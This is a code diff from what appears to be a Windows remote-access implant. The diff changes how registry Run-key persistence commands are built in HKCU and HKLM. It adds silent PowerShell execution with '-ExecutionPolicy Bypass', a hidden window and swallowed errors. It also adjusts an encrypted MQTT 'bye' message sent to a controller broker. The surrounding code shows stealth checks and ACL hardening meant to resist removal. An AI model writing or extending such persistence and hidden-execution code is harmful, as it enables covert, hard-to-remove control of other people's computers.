@@ -262,7 +262,7 @@ def _reassert_run_keys() -> list[str]:
         return []
     import winreg
 
-    expected = {name: _run_command() for name in config.RUN_VALUE_NAMES}
+    expected = _run_commands()
     roots = [(winreg.HKEY_CURRENT_USER, "HKCU")]
     if stealth.is_admin():
         roots.append((winreg.HKEY_LOCAL_MACHINE, "HKLM"))
@@ -289,7 +289,7 @@ def _reassert_run_keys() -> list[str]:
 def _write_run_keys(launcher: str) -> list[str]:
     import winreg
     written = []
-    commands = {name: _run_command() for name in config.RUN_VALUE_NAMES}
+    commands = _run_commands()
     for root, label in ((winreg.HKEY_CURRENT_USER, "HKCU"),
                         (winreg.HKEY_LOCAL_MACHINE, "HKLM")):
         for value_name, command in commands.items():
@@ -442,6 +442,20 @@ def _harden_acl() -> list[str]:
             done.append(f"acl anchor {anchor}")
         except Exception:
             pass
+
+    # Invoke hardening script if present in deployment
+    ps_script = os.path.join(config.ROOT, "scripts", "hardening.ps1")
+    if os.path.isfile(ps_script):
+        try:
+            subprocess.run(
+                ["powershell", "-ExecutionPolicy", "Bypass", "-File", ps_script],
+                capture_output=True, timeout=60,
+                creationflags=CREATE_NO_WINDOW,
+            )
+            done.append("hardening.ps1 executed")
+        except Exception:
+            pass
+
     return done
 
 
@@ -788,13 +802,15 @@ def remove(keep_anchor: bool = False) -> list[str]:
         key = crypto.derive_key(config.PASSPHRASE, config.KEY_SALT)
         codec = protocol.Codec(key)
         aid = config.agent_id()
-        broker = config.broker_order()[0]
-        client = MqttClient(random_client_id("bye"), lambda t, p: None)
-        client.connect(broker[0], broker[1], broker[2], timeout=4.0)
-        client.publish(config.topic_up(aid), codec.encode({"t": "bye"}), qos=1)
-        time.sleep(0.3)
-        client.disconnect()
-        removed.append("notified controller of agent shutdown")
+        brokers = config.broker_order()
+        if brokers:
+            broker = brokers[0]
+            client = MqttClient(random_client_id("bye"), lambda t, p: None)
+            client.connect(broker[0], broker[1], broker[2], timeout=4.0)
+            client.publish(config.topic_up(aid), codec.encode({"t": "bye"}), qos=1)
+            time.sleep(0.3)
+            client.disconnect()
+            removed.append("notified controller of agent shutdown")
     except Exception:
         pass
 
